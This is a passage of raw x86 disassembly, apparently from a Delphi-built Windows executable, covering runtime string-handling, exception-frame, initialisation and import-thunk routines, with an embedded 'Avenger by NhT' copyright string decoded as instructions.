  401664:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  40166a:	8b 4a f8             	mov    -0x8(%edx),%ecx
  40166d:	49                   	dec    %ecx
  40166e:	7c 0d                	jl     0x40167d
  401670:	ff 4a f8             	decl   -0x8(%edx)
  401673:	75 08                	jne    0x40167d
  401675:	8d 42 f8             	lea    -0x8(%edx),%eax
  401678:	e8 63 fa ff ff       	call   0x4010e0
  40167d:	83 c3 04             	add    $0x4,%ebx
  401680:	4e                   	dec    %esi
  401681:	75 db                	jne    0x40165e
  401683:	5e                   	pop    %esi
  401684:	5b                   	pop    %ebx
  401685:	c3                   	ret
  401686:	8b c0                	mov    %eax,%eax
  401688:	85 d2                	test   %edx,%edx
  40168a:	74 23                	je     0x4016af
  40168c:	8b 4a f8             	mov    -0x8(%edx),%ecx
  40168f:	41                   	inc    %ecx
  401690:	7f 1a                	jg     0x4016ac
  401692:	50                   	push   %eax
  401693:	52                   	push   %edx
  401694:	8b 42 fc             	mov    -0x4(%edx),%eax
  401697:	e8 30 00 00 00       	call   0x4016cc
  40169c:	89 c2                	mov    %eax,%edx
  40169e:	58                   	pop    %eax
  40169f:	52                   	push   %edx
  4016a0:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4016a3:	e8 7c fb ff ff       	call   0x401224
  4016a8:	5a                   	pop    %edx
  4016a9:	58                   	pop    %eax
  4016aa:	eb 03                	jmp    0x4016af
  4016ac:	ff 42 f8             	incl   -0x8(%edx)
  4016af:	87 10                	xchg   %edx,(%eax)
  4016b1:	85 d2                	test   %edx,%edx
  4016b3:	74 13                	je     0x4016c8
  4016b5:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4016b8:	49                   	dec    %ecx
  4016b9:	7c 0d                	jl     0x4016c8
  4016bb:	ff 4a f8             	decl   -0x8(%edx)
  4016be:	75 08                	jne    0x4016c8
  4016c0:	8d 42 f8             	lea    -0x8(%edx),%eax
  4016c3:	e8 18 fa ff ff       	call   0x4010e0
  4016c8:	c3                   	ret
  4016c9:	8d 40 00             	lea    0x0(%eax),%eax
  4016cc:	85 c0                	test   %eax,%eax
  4016ce:	7e 24                	jle    0x4016f4
  4016d0:	50                   	push   %eax
  4016d1:	83 c0 0a             	add    $0xa,%eax
  4016d4:	83 e0 fe             	and    $0xfffffffe,%eax
  4016d7:	50                   	push   %eax
  4016d8:	e8 eb f9 ff ff       	call   0x4010c8
  4016dd:	5a                   	pop    %edx
  4016de:	66 c7 44 02 fe 00 00 	movw   $0x0,-0x2(%edx,%eax,1)
  4016e5:	83 c0 08             	add    $0x8,%eax
  4016e8:	5a                   	pop    %edx
  4016e9:	89 50 fc             	mov    %edx,-0x4(%eax)
  4016ec:	c7 40 f8 01 00 00 00 	movl   $0x1,-0x8(%eax)
  4016f3:	c3                   	ret
  4016f4:	31 c0                	xor    %eax,%eax
  4016f6:	c3                   	ret
  4016f7:	90                   	nop
  4016f8:	53                   	push   %ebx
  4016f9:	56                   	push   %esi
  4016fa:	57                   	push   %edi
  4016fb:	89 c3                	mov    %eax,%ebx
  4016fd:	89 d6                	mov    %edx,%esi
  4016ff:	89 cf                	mov    %ecx,%edi
  401701:	89 f8                	mov    %edi,%eax
  401703:	e8 c4 ff ff ff       	call   0x4016cc
  401708:	89 f9                	mov    %edi,%ecx
  40170a:	89 c7                	mov    %eax,%edi
  40170c:	85 f6                	test   %esi,%esi
  40170e:	74 09                	je     0x401719
  401710:	89 c2                	mov    %eax,%edx
  401712:	89 f0                	mov    %esi,%eax
  401714:	e8 0b fb ff ff       	call   0x401224
  401719:	89 d8                	mov    %ebx,%eax
  40171b:	e8 14 ff ff ff       	call   0x401634
  401720:	89 3b                	mov    %edi,(%ebx)
  401722:	5f                   	pop    %edi
  401723:	5e                   	pop    %esi
  401724:	5b                   	pop    %ebx
  401725:	c3                   	ret
  401726:	8b c0                	mov    %eax,%eax
  401728:	31 c9                	xor    %ecx,%ecx
  40172a:	8a 0a                	mov    (%edx),%cl
  40172c:	42                   	inc    %edx
  40172d:	e9 c6 ff ff ff       	jmp    0x4016f8
  401732:	c3                   	ret
  401733:	90                   	nop
  401734:	57                   	push   %edi
  401735:	50                   	push   %eax
  401736:	51                   	push   %ecx
  401737:	89 d7                	mov    %edx,%edi
  401739:	31 c0                	xor    %eax,%eax
  40173b:	f2 ae                	repnz scas %es:(%edi),%al
  40173d:	75 02                	jne    0x401741
  40173f:	f7 d1                	not    %ecx
  401741:	58                   	pop    %eax
  401742:	01 c1                	add    %eax,%ecx
  401744:	58                   	pop    %eax
  401745:	5f                   	pop    %edi
  401746:	e9 ad ff ff ff       	jmp    0x4016f8
  40174b:	c3                   	ret
  40174c:	85 c0                	test   %eax,%eax
  40174e:	74 03                	je     0x401753
  401750:	8b 40 fc             	mov    -0x4(%eax),%eax
  401753:	c3                   	ret
  401754:	85 d2                	test   %edx,%edx
  401756:	74 3f                	je     0x401797
  401758:	8b 08                	mov    (%eax),%ecx
  40175a:	85 c9                	test   %ecx,%ecx
  40175c:	0f 84 26 ff ff ff    	je     0x401688
  401762:	53                   	push   %ebx
  401763:	56                   	push   %esi
  401764:	57                   	push   %edi
  401765:	89 c3                	mov    %eax,%ebx
  401767:	89 d6                	mov    %edx,%esi
  401769:	8b 79 fc             	mov    -0x4(%ecx),%edi
  40176c:	8b 56 fc             	mov    -0x4(%esi),%edx
  40176f:	01 fa                	add    %edi,%edx
  401771:	39 ce                	cmp    %ecx,%esi
  401773:	74 17                	je     0x40178c
  401775:	e8 9a 01 00 00       	call   0x401914
  40177a:	89 f0                	mov    %esi,%eax
  40177c:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40177f:	8b 13                	mov    (%ebx),%edx
  401781:	01 fa                	add    %edi,%edx
  401783:	e8 9c fa ff ff       	call   0x401224
  401788:	5f                   	pop    %edi
  401789:	5e                   	pop    %esi
  40178a:	5b                   	pop    %ebx
  40178b:	c3                   	ret
  40178c:	e8 83 01 00 00       	call   0x401914
  401791:	8b 03                	mov    (%ebx),%eax
  401793:	89 f9                	mov    %edi,%ecx
  401795:	eb e8                	jmp    0x40177f
  401797:	c3                   	ret
  401798:	85 d2                	test   %edx,%edx
  40179a:	74 61                	je     0x4017fd
  40179c:	85 c9                	test   %ecx,%ecx
  40179e:	0f 84 e4 fe ff ff    	je     0x401688
  4017a4:	3b 10                	cmp    (%eax),%edx
  4017a6:	74 5c                	je     0x401804
  4017a8:	3b 08                	cmp    (%eax),%ecx
  4017aa:	74 0e                	je     0x4017ba
  4017ac:	50                   	push   %eax
  4017ad:	51                   	push   %ecx
  4017ae:	e8 d5 fe ff ff       	call   0x401688
  4017b3:	5a                   	pop    %edx
  4017b4:	58                   	pop    %eax
  4017b5:	e9 9a ff ff ff       	jmp    0x401754
  4017ba:	53                   	push   %ebx
  4017bb:	56                   	push   %esi
  4017bc:	57                   	push   %edi
  4017bd:	89 d3                	mov    %edx,%ebx
  4017bf:	89 ce                	mov    %ecx,%esi
  4017c1:	50                   	push   %eax
  4017c2:	8b 43 fc             	mov    -0x4(%ebx),%eax
  4017c5:	03 46 fc             	add    -0x4(%esi),%eax
  4017c8:	e8 ff fe ff ff       	call   0x4016cc
  4017cd:	89 c7                	mov    %eax,%edi
  4017cf:	89 c2                	mov    %eax,%edx
  4017d1:	89 d8                	mov    %ebx,%eax
  4017d3:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  4017d6:	e8 49 fa ff ff       	call   0x401224
  4017db:	89 fa                	mov    %edi,%edx
  4017dd:	89 f0                	mov    %esi,%eax
  4017df:	8b 4e fc             	mov    -0x4(%esi),%ecx
  4017e2:	03 53 fc             	add    -0x4(%ebx),%edx
  4017e5:	e8 3a fa ff ff       	call   0x401224
  4017ea:	58                   	pop    %eax
  4017eb:	89 fa                	mov    %edi,%edx
  4017ed:	85 ff                	test   %edi,%edi
  4017ef:	74 03                	je     0x4017f4
  4017f1:	ff 4f f8             	decl   -0x8(%edi)
  4017f4:	e8 8f fe ff ff       	call   0x401688
  4017f9:	5f                   	pop    %edi
  4017fa:	5e                   	pop    %esi
  4017fb:	5b                   	pop    %ebx
  4017fc:	c3                   	ret
  4017fd:	89 ca                	mov    %ecx,%edx
  4017ff:	e9 84 fe ff ff       	jmp    0x401688
  401804:	89 ca                	mov    %ecx,%edx
  401806:	e9 49 ff ff ff       	jmp    0x401754
  40180b:	c3                   	ret
  40180c:	53                   	push   %ebx
  40180d:	56                   	push   %esi
  40180e:	57                   	push   %edi
  40180f:	89 c6                	mov    %eax,%esi
  401811:	89 d7                	mov    %edx,%edi
  401813:	39 d0                	cmp    %edx,%eax
  401815:	0f 84 8f 00 00 00    	je     0x4018aa
  40181b:	85 f6                	test   %esi,%esi
  40181d:	74 68                	je     0x401887
  40181f:	85 ff                	test   %edi,%edi
  401821:	74 6b                	je     0x40188e
  401823:	8b 46 fc             	mov    -0x4(%esi),%eax
  401826:	8b 57 fc             	mov    -0x4(%edi),%edx
  401829:	29 d0                	sub    %edx,%eax
  40182b:	77 02                	ja     0x40182f
  40182d:	01 c2                	add    %eax,%edx
  40182f:	52                   	push   %edx
  401830:	c1 ea 02             	shr    $0x2,%edx
  401833:	74 26                	je     0x40185b
  401835:	8b 0e                	mov    (%esi),%ecx
  401837:	8b 1f                	mov    (%edi),%ebx
  401839:	39 d9                	cmp    %ebx,%ecx
  40183b:	75 58                	jne    0x401895
  40183d:	4a                   	dec    %edx
  40183e:	74 15                	je     0x401855
  401840:	8b 4e 04             	mov    0x4(%esi),%ecx
  401843:	8b 5f 04             	mov    0x4(%edi),%ebx
  401846:	39 d9                	cmp    %ebx,%ecx
  401848:	75 4b                	jne    0x401895
  40184a:	83 c6 08             	add    $0x8,%esi
  40184d:	83 c7 08             	add    $0x8,%edi
  401850:	4a                   	dec    %edx
  401851:	75 e2                	jne    0x401835
  401853:	eb 06                	jmp    0x40185b
  401855:	83 c6 04             	add    $0x4,%esi
  401858:	83 c7 04             	add    $0x4,%edi
  40185b:	5a                   	pop    %edx
  40185c:	83 e2 03             	and    $0x3,%edx
  40185f:	74 22                	je     0x401883
  401861:	8b 0e                	mov    (%esi),%ecx
  401863:	8b 1f                	mov    (%edi),%ebx
  401865:	38 d9                	cmp    %bl,%cl
  401867:	75 41                	jne    0x4018aa
  401869:	4a                   	dec    %edx
  40186a:	74 17                	je     0x401883
  40186c:	38 fd                	cmp    %bh,%ch
  40186e:	75 3a                	jne    0x4018aa
  401870:	4a                   	dec    %edx
  401871:	74 10                	je     0x401883
  401873:	81 e3 00 00 ff 00    	and    $0xff0000,%ebx
  401879:	81 e1 00 00 ff 00    	and    $0xff0000,%ecx
  40187f:	39 d9                	cmp    %ebx,%ecx
  401881:	75 27                	jne    0x4018aa
  401883:	01 c0                	add    %eax,%eax
  401885:	eb 23                	jmp    0x4018aa
  401887:	8b 57 fc             	mov    -0x4(%edi),%edx
  40188a:	29 d0                	sub    %edx,%eax
  40188c:	eb 1c                	jmp    0x4018aa
  40188e:	8b 46 fc             	mov    -0x4(%esi),%eax
  401891:	29 d0                	sub    %edx,%eax
  401893:	eb 15                	jmp    0x4018aa
  401895:	5a                   	pop    %edx
  401896:	38 d9                	cmp    %bl,%cl
  401898:	75 10                	jne    0x4018aa
  40189a:	38 fd                	cmp    %bh,%ch
  40189c:	75 0c                	jne    0x4018aa
  40189e:	c1 e9 10             	shr    $0x10,%ecx
  4018a1:	c1 eb 10             	shr    $0x10,%ebx
  4018a4:	38 d9                	cmp    %bl,%cl
  4018a6:	75 02                	jne    0x4018aa
  4018a8:	38 fd                	cmp    %bh,%ch
  4018aa:	5f                   	pop    %edi
  4018ab:	5e                   	pop    %esi
  4018ac:	5b                   	pop    %ebx
  4018ad:	c3                   	ret
  4018ae:	8b c0                	mov    %eax,%eax
  4018b0:	85 c0                	test   %eax,%eax
  4018b2:	74 09                	je     0x4018bd
  4018b4:	8b 50 f8             	mov    -0x8(%eax),%edx
  4018b7:	42                   	inc    %edx
  4018b8:	7e 03                	jle    0x4018bd
  4018ba:	ff 40 f8             	incl   -0x8(%eax)
  4018bd:	c3                   	ret
  4018be:	8b c0                	mov    %eax,%eax
  4018c0:	85 c0                	test   %eax,%eax
  4018c2:	74 02                	je     0x4018c6
  4018c4:	c3                   	ret
  4018c5:	00 b8 c5 18 40 00    	add    %bh,0x4018c5(%eax)
  4018cb:	c3                   	ret
  4018cc:	8b 10                	mov    (%eax),%edx
  4018ce:	85 d2                	test   %edx,%edx
  4018d0:	74 37                	je     0x401909
  4018d2:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4018d5:	49                   	dec    %ecx
  4018d6:	74 31                	je     0x401909
  4018d8:	53                   	push   %ebx
  4018d9:	89 c3                	mov    %eax,%ebx
  4018db:	8b 42 fc             	mov    -0x4(%edx),%eax
  4018de:	e8 e9 fd ff ff       	call   0x4016cc
  4018e3:	89 c2                	mov    %eax,%edx
  4018e5:	8b 03                	mov    (%ebx),%eax
  4018e7:	89 13                	mov    %edx,(%ebx)
  4018e9:	50                   	push   %eax
  4018ea:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4018ed:	e8 32 f9 ff ff       	call   0x401224
  4018f2:	58                   	pop    %eax
  4018f3:	8b 48 f8             	mov    -0x8(%eax),%ecx
  4018f6:	49                   	dec    %ecx
  4018f7:	7c 0d                	jl     0x401906
  4018f9:	ff 48 f8             	decl   -0x8(%eax)
  4018fc:	75 08                	jne    0x401906
  4018fe:	8d 40 f8             	lea    -0x8(%eax),%eax
  401901:	e8 da f7 ff ff       	call   0x4010e0
  401906:	8b 13                	mov    (%ebx),%edx
  401908:	5b                   	pop    %ebx
  401909:	89 d0                	mov    %edx,%eax
  40190b:	c3                   	ret
  40190c:	e9 bb ff ff ff       	jmp    0x4018cc
  401911:	c3                   	ret
  401912:	8b c0                	mov    %eax,%eax
  401914:	53                   	push   %ebx
  401915:	56                   	push   %esi
  401916:	57                   	push   %edi
  401917:	89 c3                	mov    %eax,%ebx
  401919:	89 d6                	mov    %edx,%esi
  40191b:	31 ff                	xor    %edi,%edi
  40191d:	85 d2                	test   %edx,%edx
  40191f:	7e 48                	jle    0x401969
  401921:	8b 03                	mov    (%ebx),%eax
  401923:	85 c0                	test   %eax,%eax
  401925:	74 23                	je     0x40194a
  401927:	83 78 f8 01          	cmpl   $0x1,-0x8(%eax)
  40192b:	75 1d                	jne    0x40194a
  40192d:	83 e8 08             	sub    $0x8,%eax
  401930:	83 c2 09             	add    $0x9,%edx
  401933:	50                   	push   %eax
  401934:	89 e0                	mov    %esp,%eax
  401936:	e8 bd f7 ff ff       	call   0x4010f8
  40193b:	58                   	pop    %eax
  40193c:	83 c0 08             	add    $0x8,%eax
  40193f:	89 03                	mov    %eax,(%ebx)
  401941:	89 70 fc             	mov    %esi,-0x4(%eax)
  401944:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  401948:	eb 28                	jmp    0x401972
  40194a:	89 d0                	mov    %edx,%eax
  40194c:	e8 7b fd ff ff       	call   0x4016cc
  401951:	89 c7                	mov    %eax,%edi
  401953:	8b 03                	mov    (%ebx),%eax
  401955:	85 c0                	test   %eax,%eax
  401957:	74 10                	je     0x401969
  401959:	89 fa                	mov    %edi,%edx
  40195b:	8b 48 fc             	mov    -0x4(%eax),%ecx
  40195e:	39 f1                	cmp    %esi,%ecx
  401960:	7c 02                	jl     0x401964
  401962:	89 f1                	mov    %esi,%ecx
  401964:	e8 bb f8 ff ff       	call   0x401224
  401969:	89 d8                	mov    %ebx,%eax
  40196b:	e8 c4 fc ff ff       	call   0x401634
  401970:	89 3b                	mov    %edi,(%ebx)
  401972:	5f                   	pop    %edi
  401973:	5e                   	pop    %esi
  401974:	5b                   	pop    %ebx
  401975:	c3                   	ret
  401976:	8b c0                	mov    %eax,%eax
  401978:	c3                   	ret
  401979:	8d 40 00             	lea    0x0(%eax),%eax
  40197c:	b0 10                	mov    $0x10,%al
  40197e:	e9 1d f8 ff ff       	jmp    0x4011a0
  401983:	c3                   	ret
  401984:	66 8b 00             	mov    (%eax),%ax
  401987:	66 83 e8 02          	sub    $0x2,%ax
  40198b:	72 0b                	jb     0x401998
  40198d:	66 83 e8 08          	sub    $0x8,%ax
  401991:	74 05                	je     0x401998
  401993:	e8 e4 ff ff ff       	call   0x40197c
  401998:	c3                   	ret
  401999:	8d 40 00             	lea    0x0(%eax),%eax
  40199c:	ba bc 45 40 00       	mov    $0x4045bc,%edx
  4019a1:	33 c0                	xor    %eax,%eax
  4019a3:	c7 04 82 7c 19 40 00 	movl   $0x40197c,(%edx,%eax,4)
  4019aa:	40                   	inc    %eax
  4019ab:	83 f8 2b             	cmp    $0x2b,%eax
  4019ae:	75 f3                	jne    0x4019a3
  4019b0:	b8 84 19 40 00       	mov    $0x401984,%eax
  4019b5:	a3 bc 45 40 00       	mov    %eax,0x4045bc
  4019ba:	c3                   	ret
  4019bb:	90                   	nop
  4019bc:	b0 11                	mov    $0x11,%al
  4019be:	e9 dd f7 ff ff       	jmp    0x4011a0
  4019c3:	c3                   	ret
  4019c4:	8b 15 0c 30 40 00    	mov    0x40300c,%edx
  4019ca:	89 10                	mov    %edx,(%eax)
  4019cc:	a3 0c 30 40 00       	mov    %eax,0x40300c
  4019d1:	c3                   	ret
  4019d2:	8b c0                	mov    %eax,%eax
  4019d4:	53                   	push   %ebx
  4019d5:	56                   	push   %esi
  4019d6:	8b f0                	mov    %eax,%esi
  4019d8:	8b 1d 10 30 40 00    	mov    0x403010,%ebx
  4019de:	85 db                	test   %ebx,%ebx
  4019e0:	74 0c                	je     0x4019ee
  4019e2:	8b 46 04             	mov    0x4(%esi),%eax
  4019e5:	ff 53 04             	call   *0x4(%ebx)
  4019e8:	8b 1b                	mov    (%ebx),%ebx
  4019ea:	85 db                	test   %ebx,%ebx
  4019ec:	75 f4                	jne    0x4019e2
  4019ee:	5e                   	pop    %esi
  4019ef:	5b                   	pop    %ebx
  4019f0:	c3                   	ret
  4019f1:	8d 40 00             	lea    0x0(%eax),%eax
  4019f4:	55                   	push   %ebp
  4019f5:	8b ec                	mov    %esp,%ebp
  4019f7:	33 c0                	xor    %eax,%eax
  4019f9:	55                   	push   %ebp
  4019fa:	68 27 1a 40 00       	push   $0x401a27
  4019ff:	64 ff 30             	push   %fs:(%eax)
  401a02:	64 89 20             	mov    %esp,%fs:(%eax)
  401a05:	ff 05 88 45 40 00    	incl   0x404588
  401a0b:	75 0c                	jne    0x401a19
  401a0d:	ff 15 58 30 40 00    	call   *0x403058
  401a13:	ff 15 24 30 40 00    	call   *0x403024
  401a19:	33 c0                	xor    %eax,%eax
  401a1b:	5a                   	pop    %edx
  401a1c:	59                   	pop    %ecx
  401a1d:	59                   	pop    %ecx
  401a1e:	64 89 10             	mov    %edx,%fs:(%eax)
  401a21:	68 2e 1a 40 00       	push   $0x401a2e
  401a26:	c3                   	ret
  401a27:	e9 d8 f9 ff ff       	jmp    0x401404
  401a2c:	eb f8                	jmp    0x401a26
  401a2e:	5d                   	pop    %ebp
  401a2f:	c3                   	ret
  401a30:	83 2d 88 45 40 00 01 	subl   $0x1,0x404588
  401a37:	73 3e                	jae    0x401a77
  401a39:	e8 c2 f5 ff ff       	call   0x401000
  401a3e:	a3 8c 45 40 00       	mov    %eax,0x40458c
  401a43:	c7 05 00 40 40 00 bc 	movl   $0x4019bc,0x404000
  401a4a:	19 40 00 
  401a4d:	66 c7 05 28 40 40 00 	movw   $0xd7b0,0x404028
  401a54:	b0 d7 
  401a56:	66 c7 05 f4 41 40 00 	movw   $0xd7b0,0x4041f4
  401a5d:	b0 d7 
  401a5f:	66 c7 05 c0 43 40 00 	movw   $0xd7b0,0x4043c0
  401a66:	b0 d7 
  401a68:	e8 2f ff ff ff       	call   0x40199c
  401a6d:	e8 fe f5 ff ff       	call   0x401070
  401a72:	a3 18 40 40 00       	mov    %eax,0x404018
  401a77:	c3                   	ret
  401a78:	ff                   	(bad)
  401a79:	ff                   	(bad)
  401a7a:	ff                   	(bad)
  401a7b:	ff 2f                	ljmp   *(%edi)
  401a7d:	00 00                	add    %al,(%eax)
  401a7f:	00 50 6f             	add    %dl,0x6f(%eax)
  401a82:	72 74                	jb     0x401af8
  401a84:	69 6f 6e 73 20 43 6f 	imul   $0x6f432073,0x6e(%edi),%ebp
  401a8b:	70 79                	jo     0x401b06
  401a8d:	72 69                	jb     0x401af8
  401a8f:	67 68 74 20 28 63    	addr16 push $0x63282074
  401a95:	29 20                	sub    %esp,(%eax)
  401a97:	31 39                	xor    %edi,(%ecx)
  401a99:	39 39                	cmp    %edi,(%ecx)
  401a9b:	2c 32                	sub    $0x32,%al
  401a9d:	30 30                	xor    %dh,(%eax)
  401a9f:	33 20                	xor    (%eax),%esp
  401aa1:	41                   	inc    %ecx
  401aa2:	76 65                	jbe    0x401b09
  401aa4:	6e                   	outsb  %ds:(%esi),(%dx)
  401aa5:	67 65 72 20          	addr16 gs jb 0x401ac9
  401aa9:	62 79 20             	bound  %edi,0x20(%ecx)
  401aac:	4e                   	dec    %esi
  401aad:	68 54 00 50 6a       	push   $0x6a500054
  401ab2:	40                   	inc    %eax
  401ab3:	e8 78 f5 ff ff       	call   0x401030
  401ab8:	c3                   	ret
  401ab9:	8d 40 00             	lea    0x0(%eax),%eax
  401abc:	b8 04 00 00 00       	mov    $0x4,%eax
  401ac1:	c3                   	ret
  401ac2:	8b c0                	mov    %eax,%eax
  401ac4:	53                   	push   %ebx
  401ac5:	e8 f2 ff ff ff       	call   0x401abc
  401aca:	8b d8                	mov    %eax,%ebx
  401acc:	85 db                	test   %ebx,%ebx
  401ace:	74 36                	je     0x401b06
  401ad0:	83 3d 60 30 40 00 ff 	cmpl   $0xffffffff,0x403060
  401ad7:	75 0a                	jne    0x401ae3
  401ad9:	b8 e2 00 00 00       	mov    $0xe2,%eax
  401ade:	e8 45 fb ff ff       	call   0x401628
  401ae3:	8b c3                	mov    %ebx,%eax
  401ae5:	e8 c6 ff ff ff       	call   0x401ab0
  401aea:	85 c0                	test   %eax,%eax
  401aec:	75 0c                	jne    0x401afa
  401aee:	b8 e2 00 00 00       	mov    $0xe2,%eax
  401af3:	e8 30 fb ff ff       	call   0x401628
  401af8:	eb 0c                	jmp    0x401b06
  401afa:	50                   	push   %eax
  401afb:	a1 60 30 40 00       	mov    0x403060,%eax
  401b00:	50                   	push   %eax
  401b01:	e8 3a f5 ff ff       	call   0x401040
  401b06:	5b                   	pop    %ebx
  401b07:	c3                   	ret
  401b08:	8a 0d 68 46 40 00    	mov    0x404668,%cl
  401b0e:	a1 60 30 40 00       	mov    0x403060,%eax
  401b13:	84 c9                	test   %cl,%cl
  401b15:	75 26                	jne    0x401b3d
  401b17:	64 8b 15 2c 00 00 00 	mov    %fs:0x2c,%edx
  401b1e:	8b 04 82             	mov    (%edx,%eax,4),%eax
  401b21:	c3                   	ret
  401b22:	e8 9d ff ff ff       	call   0x401ac4
  401b27:	a1 60 30 40 00       	mov    0x403060,%eax
  401b2c:	50                   	push   %eax
  401b2d:	e8 06 f5 ff ff       	call   0x401038
  401b32:	85 c0                	test   %eax,%eax
  401b34:	74 01                	je     0x401b37
  401b36:	c3                   	ret
  401b37:	a1 74 46 40 00       	mov    0x404674,%eax
  401b3c:	c3                   	ret
  401b3d:	50                   	push   %eax
  401b3e:	e8 f5 f4 ff ff       	call   0x401038
  401b43:	85 c0                	test   %eax,%eax
  401b45:	74 db                	je     0x401b22
  401b47:	c3                   	ret
  401b48:	b8 64 30 40 00       	mov    $0x403064,%eax
  401b4d:	e8 72 fe ff ff       	call   0x4019c4
  401b52:	c3                   	ret
  401b53:	90                   	nop
  401b54:	53                   	push   %ebx
  401b55:	8b d8                	mov    %eax,%ebx
  401b57:	33 c0                	xor    %eax,%eax
  401b59:	a3 60 30 40 00       	mov    %eax,0x403060
  401b5e:	6a 00                	push   $0x0
  401b60:	e8 c3 f4 ff ff       	call   0x401028
  401b65:	a3 6c 46 40 00       	mov    %eax,0x40466c
  401b6a:	a1 6c 46 40 00       	mov    0x40466c,%eax
  401b6f:	a3 68 30 40 00       	mov    %eax,0x403068
  401b74:	33 c0                	xor    %eax,%eax
  401b76:	a3 6c 30 40 00       	mov    %eax,0x40306c
  401b7b:	33 c0                	xor    %eax,%eax
  401b7d:	a3 70 30 40 00       	mov    %eax,0x403070
  401b82:	e8 c1 ff ff ff       	call   0x401b48
  401b87:	ba 64 30 40 00       	mov    $0x403064,%edx
  401b8c:	8b c3                	mov    %ebx,%eax
  401b8e:	e8 4d f9 ff ff       	call   0x4014e0
  401b93:	5b                   	pop    %ebx
  401b94:	c3                   	ret
  401b95:	8d 40 00             	lea    0x0(%eax),%eax
  401b98:	55                   	push   %ebp
  401b99:	8b ec                	mov    %esp,%ebp
  401b9b:	33 c0                	xor    %eax,%eax
  401b9d:	55                   	push   %ebp
  401b9e:	68 c9 1b 40 00       	push   $0x401bc9
  401ba3:	64 ff 30             	push   %fs:(%eax)
  401ba6:	64 89 20             	mov    %esp,%fs:(%eax)
  401ba9:	ff 05 70 46 40 00    	incl   0x404670
  401baf:	75 0a                	jne    0x401bbb
  401bb1:	b8 5c 30 40 00       	mov    $0x40305c,%eax
  401bb6:	e8 79 fa ff ff       	call   0x401634
  401bbb:	33 c0                	xor    %eax,%eax
  401bbd:	5a                   	pop    %edx
  401bbe:	59                   	pop    %ecx
  401bbf:	59                   	pop    %ecx
  401bc0:	64 89 10             	mov    %edx,%fs:(%eax)
  401bc3:	68 d0 1b 40 00       	push   $0x401bd0
  401bc8:	c3                   	ret
  401bc9:	e9 36 f8 ff ff       	jmp    0x401404
  401bce:	eb f8                	jmp    0x401bc8
  401bd0:	5d                   	pop    %ebp
  401bd1:	c3                   	ret
  401bd2:	8b c0                	mov    %eax,%eax
  401bd4:	83 2d 70 46 40 00 01 	subl   $0x1,0x404670
  401bdb:	c3                   	ret
  401bdc:	55                   	push   %ebp
  401bdd:	8b ec                	mov    %esp,%ebp
  401bdf:	33 c0                	xor    %eax,%eax
  401be1:	55                   	push   %ebp
  401be2:	68 01 1c 40 00       	push   $0x401c01
  401be7:	64 ff 30             	push   %fs:(%eax)
  401bea:	64 89 20             	mov    %esp,%fs:(%eax)
  401bed:	ff 05 78 46 40 00    	incl   0x404678
  401bf3:	33 c0                	xor    %eax,%eax
  401bf5:	5a                   	pop    %edx
  401bf6:	59                   	pop    %ecx
  401bf7:	59                   	pop    %ecx
  401bf8:	64 89 10             	mov    %edx,%fs:(%eax)
  401bfb:	68 08 1c 40 00       	push   $0x401c08
  401c00:	c3                   	ret
  401c01:	e9 fe f7 ff ff       	jmp    0x401404
  401c06:	eb f8                	jmp    0x401c00
  401c08:	5d                   	pop    %ebp
  401c09:	c3                   	ret
  401c0a:	8b c0                	mov    %eax,%eax
  401c0c:	83 2d 78 46 40 00 01 	subl   $0x1,0x404678
  401c13:	c3                   	ret
  401c14:	ff 25 d0 50 40 00    	jmp    *0x4050d0
  401c1a:	8b c0                	mov    %eax,%eax
  401c1c:	ff 25 cc 50 40 00    	jmp    *0x4050cc
  401c22:	8b c0                	mov    %eax,%eax
  401c24:	ff 25 c8 50 40 00    	jmp    *0x4050c8
  401c2a:	8b c0                	mov    %eax,%eax
  401c2c:	ff 25 c4 50 40 00    	jmp    *0x4050c4
  401c32:	8b c0                	mov    %eax,%eax
  401c34:	ff 25 c0 50 40 00    	jmp    *0x4050c0
  401c3a:	8b c0                	mov    %eax,%eax
  401c3c:	ff 25 bc 50 40 00    	jmp    *0x4050bc
  401c42:	8b c0                	mov    %eax,%eax
  401c44:	ff 25 b8 50 40 00    	jmp    *0x4050b8
  401c4a:	8b c0                	mov    %eax,%eax
  401c4c:	ff 25 b4 50 40 00    	jmp    *0x4050b4
  401c52:	8b c0                	mov    %eax,%eax
  401c54:	ff 25 b0 50 40 00    	jmp    *0x4050b0
  401c5a:	8b c0                	mov    %eax,%eax
  401c5c:	ff 25 ac 50 40 00    	jmp    *0x4050ac
  401c62:	8b c0                	mov    %eax,%eax
  401c64:	ff 25 a8 50 40 00    	jmp    *0x4050a8
  401c6a:	8b c0                	mov    %eax,%eax
  401c6c:	ff 25 a4 50 40 00    	jmp    *0x4050a4
  401c72:	8b c0                	mov    %eax,%eax
  401c74:	55                   	push   %ebp
  401c75:	8b ec                	mov    %esp,%ebp
  401c77:	33 c0                	xor    %eax,%eax
  401c79:	55                   	push   %ebp
  401c7a:	68 99 1c 40 00       	push   $0x401c99
  401c7f:	64 ff 30             	push   %fs:(%eax)
  401c82:	64 89 20             	mov    %esp,%fs:(%eax)
  401c85:	ff 05 7c 46 40 00    	incl   0x40467c
  401c8b:	33 c0                	xor    %eax,%eax
  401c8d:	5a                   	pop    %edx
  401c8e:	59                   	pop    %ecx
  401c8f:	59                   	pop    %ecx
  401c90:	64 89 10             	mov    %edx,%fs:(%eax)
  401c93:	68 a0 1c 40 00       	push   $0x401ca0
  401c98:	c3                   	ret
  401c99:	e9 66 f7 ff ff       	jmp    0x401404
  401c9e:	eb f8                	jmp    0x401c98
  401ca0:	5d                   	pop    %ebp
  401ca1:	c3                   	ret
  401ca2:	8b c0                	mov    %eax,%eax
  401ca4:	83 2d 7c 46 40 00 01 	subl   $0x1,0x40467c
  401cab:	c3                   	ret
  401cac:	ff 25 e0 50 40 00    	jmp    *0x4050e0
  401cb2:	8b c0                	mov    %eax,%eax
  401cb4:	53                   	push   %ebx
  401cb5:	8b d8                	mov    %eax,%ebx
  401cb7:	8b d3                	mov    %ebx,%edx
  401cb9:	33 c0                	xor    %eax,%eax
  401cbb:	e8 ec f4 ff ff       	call   0x4011ac
  401cc0:	8b c3                	mov    %ebx,%eax
  401cc2:	ba d8 1c 40 00       	mov    $0x401cd8,%edx
